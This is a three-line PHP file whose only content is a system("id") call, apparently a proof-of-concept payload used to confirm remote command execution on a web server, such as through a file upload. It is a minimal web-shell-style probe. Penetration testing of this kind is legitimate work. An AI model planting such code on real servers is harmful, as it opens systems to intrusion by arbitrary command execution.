<?php
system("id");
?>
